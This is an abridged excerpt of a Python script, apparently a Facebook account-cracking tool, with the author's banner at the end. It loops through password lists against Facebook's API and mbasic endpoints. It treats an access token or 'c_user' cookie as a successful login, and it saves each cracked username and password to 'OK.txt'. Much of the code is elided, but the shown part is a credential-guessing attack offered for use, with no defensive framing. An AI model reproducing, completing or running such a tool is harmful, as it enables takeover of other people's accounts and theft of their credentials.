	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if "access_token" in p:
				IMTIAZ_AKING('\r\033[1;92m[Successful-AXB] %s | %s%s      '%(user,pw,tahun(user)))
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;32m[Successful-AXB] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
##     ## ##     ## ########  
 [*]=============================================
    Author   : AZAN CHAUDRY
    Facebook : https://facebook.com/MR-AZAN
    Team     : ALONE
    Connect  : MAZAK THORI HAIN
 [*]=============================================
